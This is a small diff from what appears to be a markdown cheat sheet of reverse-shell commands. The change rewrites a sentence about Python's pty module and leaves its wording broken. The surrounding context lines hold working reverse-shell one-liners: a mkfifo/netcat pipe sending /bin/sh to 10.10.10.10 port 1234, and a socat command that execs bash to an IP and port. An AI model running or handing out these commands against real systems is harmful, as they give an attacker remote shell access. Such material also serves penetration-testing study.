@@ -20,7 +20,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT
 ```
 
-> The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a pseudo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal.
+> The #pseudo-terminals  let’s you spawn a pseudo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal.
 
 ### Windows
 
